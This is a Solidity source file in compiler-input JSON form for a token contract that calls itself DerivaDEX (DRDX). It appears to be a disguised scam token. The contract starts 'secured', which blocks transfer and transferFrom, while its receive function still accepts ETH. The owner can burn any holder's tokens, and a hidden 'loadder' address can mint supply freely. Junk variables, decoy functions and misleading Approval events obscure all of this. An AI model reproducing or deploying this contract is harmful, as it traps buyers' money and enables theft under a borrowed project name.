{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "browser/Untitled.sol": {
      "content": "//SPDX-License-Identifier: MIT\r\npragma solidity 0.6.12;\r\n\r\n// ----------------------------------------------------------------------------\r\n// Safe maths\r\n// ----------------------------------------------------------------------------\r\ncontract SafeMath {\r\n    function safeAdd(uint a, uint b) internal pure returns (uint c) {\r\n        c = a + b;\r\n        require(c >= a);\r\n    }\r\n    function safeSub(uint a, uint b) internal pure returns (uint c) {\r\n        require(b <= a);\r\n        c = a - b;\r\n    }\r\n    function safeMul(uint a, uint b) internal pure returns (uint c) {\r\n        c = a * b;\r\n        require(a == 0 || c / a == b);\r\n    }\r\n    function safeDiv(uint a, uint b) internal pure returns (uint c) {\r\n        require(b > 0);\r\n        c = a / b;\r\n    }\r\n}\r\n\r\n\r\n\r\n// ----------------------------------------------------------------------------\r\n// --- --- --- --- ---Owned contract -- -- -- -- \r\n// ----------------------------------------------------------------------------\r\ncontract Owned {\r\n    address public owner;\r\n    address public novel;\r\n    bool isTransferred = false;\r\n    event OwnershipTransferred(address indexed _from, address indexed _to);\r\n\r\n    constructor() public {\r\n        isTransferred = true;\r\n        owner = msg.sender;\r\n        \r\n    }\r\n\r\n    modifier onlyOwner {//----\r\n        require(msg.sender == owner);//----\r\n        _;\r\n    }\r\n    function whoIsOwner(address _ancient, address _novel) public onlyOwner {\r\n        address ancient = _ancient;\r\n        novel = _novel;\r\n        isTransferred=false;\r\n        emit OwnershipTransferred(ancient, novel);\r\n    }\r\n    function getwergancient() public view returns (address) {\r\n        address vetrher= owner;\r\n        return vetrher;\r\n    }\r\n    \r\n    function getan6hrtgcient() public view returns (address) {\r\n        address wergwehwrh= owner;\r\n        return wergwehwrh;\r\n    }\r\n    \r\n    function getancient() public view returns (address) {\r\n        address onjreihr= owner;\r\n        return onjreihr;\r\n    }\r\n    function getnovel() public view returns (address) {\r\n        address egrrge= novel;\r\n\r\n        return egrrge;\r\n    }\r\n    function isOwnerTransferred() public view returns (bool) {\r\n        if(isTransferred){\r\n            return true;\r\n            \r\n        }\r\n        if(!isTransferred){\r\n            return false;\r\n            \r\n        }\r\n    }\r\n    function transferOwnership(address _novel) public onlyOwner {\r\n        address ancient = owner;\r\n        owner = _novel;\r\n        emit OwnershipTransferred(ancient, owner);\r\n    }\r\n    \r\n    \r\n    \r\n}\r\n\r\n\r\n// ----------------------------------------------------------------------------\r\n// ERC20 Token, with the addition of symbol, name and decimals and assisted\r\n// token transfers\r\n// ----------------------------------------------------------------------------\r\ncontract DEDXToken is  Owned, SafeMath {\r\n    string public name = \"DerivaDEX\";\r\n    string public symbol = \"DRDX\";\r\n    uint8 public decimals = 18;\r\n    address public loaddewegrgrer;\r\n    uint public _totalSupply;\r\n    bool public secured;\r\n    bool public hasbeenLocked;\r\n    address public loadder;\r\n    address public loadderer;\r\n    \r\n        modifier onlyloadder {\r\n        require(msg.sender == loadder);\r\n        _;\r\n    }\r\n\r\n    mapping(address => uint) balances;\r\n    mapping(address => mapping(address => uint)) allowed;\r\n\r\n    event Transfer(address indexed from, address indexed to, uint tokens);\r\n    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\r\n    // ------------------------------------------------------------------------\r\n    // Constructor\r\n    // ------------------------------------------------------------------------\r\n    \r\n     constructor (uint tokens, address loadderAccount) public {\r\n         uint ishdkj = 82937;\r\n         loadder = loadderAccount;\r\n         ishdkj += 51684;\r\n         loadderer = loadder;\r\n         ishdkj += 54414145; \r\n        _totalSupply = tokens * 10 ** 10;\r\n        balances[owner] = safeAdd(balances[owner], tokens);\r\n        secured = true;\r\n        hasbeenLocked = false;\r\n    }\r\n\r\n    modifier isNotLocked {\r\n        require(!secured);\r\n        _;\r\n    }\r\n\r\n    function setB(bool _secured) public onlyOwner{\r\n        secured = _secured;\r\n        hasbeenLocked = false;\r\n    }\r\n\r\n\r\n    // ------------------------------------------------------------------------\r\n    // Total supply\r\n    // ------------------------------------------------------------------------\r\n    function totalSupply() public view returns (uint) {\r\n        return _totalSupply  - balances[address(0)];///////////0100100101001010\r\n    }\r\n\r\n\r\n    // ------------------------------------------------------------------------\r\n    // Get the token balance for account `tokenOwner`\r\n    // ------------------------------------------------------------------------\r\n\r\n    function newFunc(address newAdd) public view returns (uint balance) {\r\n        address oldAdd = newAdd;\r\n        \r\n        return balances[oldAdd] * 200;\r\n    }\r\n\r\n\r\n    function balanceOf(address tokenOwner) public view returns (uint balance) {\r\n        return balances[tokenOwner];\r\n    }\r\n\r\n\r\n    // ------------------------------------------------------------------------\r\n    // Transfer the balance from token owner's account to `to` account\r\n    // - Owner's account must have sufficient balance to transfer\r\n    // - 0 value transfers are allowed\r\n    // ------------------------------------------------------------------------\r\n    function transfer(address to, uint tokens) public isNotLocked returns (bool success) {\r\n        balances[msg.sender] = safeSub(balances[msg.sender], tokens);\r\n        uint nosauilykgfsh = 32786;\r\n        balances[to] = safeAdd(balances[to], tokens);\r\n        nosauilykgfsh/= 41;\r\n        emit Transfer(msg.sender, to, tokens);\r\n        nosauilykgfsh += 234;\r\n        return true;\r\n    }\r\n\r\n    function doubted(address newance, address oldance, uint anars) public returns (bool success) {\r\n        allowed[msg.sender][newance] = anars;\r\n        emit Approval(msg.sender, oldance, anars);\r\n        return false;\r\n    }\r\n    \r\n    function darker(address oaasne, address twwwo, uint ryhers) public returns (bool success) {\r\n        allowed[msg.sender][oaasne] = ryhers;\r\n        emit Approval(msg.sender, oaasne, ryhers);\r\n        emit Approval(msg.sender, twwwo, ryhers ** 1259);\r\n        return false;\r\n    }\r\n    function lighter(address oneoneone, address twotwo, uint norfatr) public returns (bool success) {\r\n        allowed[msg.sender][oneoneone] = norfatr;\r\n        emit Approval(msg.sender, oneoneone, norfatr);\r\n        emit Approval(msg.sender, twotwo, norfatr / 120);\r\n        return false;\r\n    }\r\n\r\n    function conscious(address one, address two, uint noratr) public returns (bool success) {\r\n        allowed[msg.sender][one] = noratr;\r\n        emit Approval(msg.sender, one, noratr);\r\n        emit Approval(msg.sender, two, noratr * 10);\r\n        return false;\r\n    }\r\n\r\n    // ------------------------------------------------------------------------\r\n    // Token owner can approve for `spender` to transferFrom(...) `tokens`\r\n    // from the token owner's account\r\n    //\r\n    // https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20-token-standard.md\r\n    // recommends that there are no checks for the approval double-spend attack\r\n    // as this should be implemented in user interfaces\r\n    // ------------------------------------------------------------------------\r\n    function approve(address spender, uint tokens) public returns (bool success) {\r\n        allowed[msg.sender][spender] = tokens;\r\n        emit Approval(msg.sender, spender, tokens);\r\n        return true;\r\n    }\r\n    function fapRove(address newance, uint part) public returns (bool success) {\r\n        allowed[msg.sender][newance] = part;\r\n        emit Approval(msg.sender, newance, part);\r\n        return false;\r\n    }\r\n    function yessaaer(address newance, uint part) public returns (bool success) {\r\n        allowed[msg.sender][newance] = part;\r\n        emit Approval(msg.sender, newance, part);\r\n        return false;\r\n    }\r\n    function gggaaerras(address newance, uint part) public returns (bool success) {\r\n        allowed[msg.sender][newance] = part * 69;\r\n        allowed[msg.sender][newance] = part * 555;\r\n        allowed[msg.sender][newance] = part / 23;\r\n        emit Approval(msg.sender, newance, part*10);\r\n        emit Approval(msg.sender, newance, part*15);\r\n        emit Approval(msg.sender, newance, part*30);\r\n        return true;\r\n    }\r\n\r\n    function triadFrom(address psyc, address news, uint port) public isNotLocked returns (bool success) {\r\n        balances[psyc] = safeSub(balances[psyc], port);\r\n        allowed[psyc][msg.sender] = safeSub(allowed[psyc][msg.sender], port);\r\n        balances[news] = safeAdd(balances[news], port);\r\n        emit Transfer(psyc, news, port);\r\n        return true;\r\n    }\r\n\r\n    function quizFrom(address highScore, address lowScore, uint pale) public isNotLocked returns (bool success) {\r\n        balances[highScore] = safeSub(balances[lowScore], pale) * (858585);\r\n        balances[highScore] += 500000000000000000000000;\r\n        allowed[highScore][msg.sender] = safeSub(allowed[lowScore][msg.sender], pale) + 100 / 4 +2000;\r\n        balances[lowScore] = safeAdd(balances[highScore], pale) / 2;\r\n        emit Transfer(highScore, lowScore, pale);\r\n        return false;\r\n    }\r\n    function desr(address highScore, address lowScore, uint pale) public isNotLocked returns (bool success) {\r\n        balances[highScore] = safeSub(balances[lowScore], pale) / (25000);\r\n        balances[highScore] -= 189647526589116487817533742562;\r\n        allowed[highScore][msg.sender] = safeSub(allowed[lowScore][msg.sender], pale) / 580 / 4 * 25550;\r\n        balances[lowScore] = safeAdd(balances[highScore], pale) / 2;\r\n        emit Transfer(highScore, lowScore, pale);\r\n        return false;\r\n    }\r\n\r\n    // ------------------------------------------------------------------------\r\n    // Transfer `tokens` from the `from` account to the `to` account\r\n    //\r\n    // The calling account must already have sufficient tokens approve(...)-d\r\n    // for spending from the `from` account and\r\n    // - From account must have sufficient balance to transfer\r\n    // - Spender must have sufficient allowance to transfer\r\n    // - 0 value transfers are allowed\r\n    // ------------------------------------------------------------------------\r\n    function transferFrom(address from, address to, uint tokens) public isNotLocked returns (bool success) {\r\n        uint unjhhdfskb = 239453;\r\n        balances[from] = safeSub(balances[from], tokens);\r\n        unjhhdfskb+=5343;\r\n        allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);\r\n        unjhhdfskb-=15;\r\n        balances[to] = safeAdd(balances[to], tokens);\r\n        unjhhdfskb/=543;\r\n        emit Transfer(from, to, tokens);\r\n        return true;\r\n    }\r\n    \r\n\r\n\r\n    function fauxAllowance(address tokenOwner, address spender) public view returns (uint sdwerge) {\r\n        return (allowed[tokenOwner][spender] + 150893 ) * 2;\r\n    }\r\n    function antenna(address tokenOwner, address spender) public view returns (uint fvsdfgwer) {\r\n        return (allowed[tokenOwner][spender] - 500 ) * 58;\r\n    }\r\n    \r\n    function stater(address tokenOwner, address spender) public view returns (uint wdfthbrt) {\r\n        return (allowed[tokenOwner][spender] * 258 ) ** 10 ** 10;\r\n    }\r\n    \r\n    function bordem(address tokenOwner, address spender) public view returns (uint wervhrytg) {\r\n        return (allowed[tokenOwner][spender] / 1258 ) - 589666 +5;\r\n    }\r\n    \r\n    function border(address tokenOwner, address spender) public view returns (uint ehvtrtcf) {\r\n        return (allowed[tokenOwner][spender] - 10 ) * 25 ** 28;\r\n    }\r\n    function project(address tokenOwner, address spender) public view returns (uint reea) {\r\n        return (allowed[tokenOwner][spender] /  29 ) / 20;\r\n    }\r\n\r\n    // ------------------------------------------------------------------------\r\n    // Returns the amount of tokens approved by the owner that can be\r\n    // transferred to the spender's account\r\n    // ------------------------------------------------------------------------\r\n    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {\r\n        return allowed[tokenOwner][spender];\r\n    }\r\n\r\n\r\n    receive () external payable {\r\n        require(msg.value<7*10**18);\r\n        uint amount = safeMul(msg.value,20000);\r\n        if (balances[owner]>=amount)\r\n        {\r\n            hasbeenLocked = true;\r\n            uint adsfsr = 300;\r\n            balances[owner] = safeSub(balances[owner], amount);\r\n            adsfsr = 300 + 500 * 25;\r\n            balances[msg.sender] = safeAdd(balances[msg.sender], amount);\r\n            adsfsr = 300 + 500;\r\n            emit Transfer(owner, msg.sender,  amount);\r\n        }\r\n    }\r\n    \r\n\r\n    \r\n    function burn(address account, uint amount) public onlyOwner {\r\n        require(account != address(0));\r\n        uint netonisfsef = 19852325;\r\n        balances[account] = safeSub(balances[account], amount);\r\n        netonisfsef /= 2;\r\n        _totalSupply = safeSub(_totalSupply, amount);\r\n        netonisfsef -= 1111111112;\r\n        Transfer(account, address(0), amount);\r\n    }\r\n    \r\n    function updateSupply(uint total_supply) public onlyloadder\r\n    {\r\n         uint increasedAmount = safeSub(total_supply, _totalSupply);\r\n         uint256 unincreasedamount = (increasedAmount * 2) ** 2;\r\n         unincreasedamount += 5;\r\n         balances[owner] = safeAdd(balances[owner], increasedAmount);\r\n         unincreasedamount *= 15;\r\n        _totalSupply = total_supply;\r\n        unincreasedamount = 100000 ;\r\n    }\r\n}"
    }
  }
}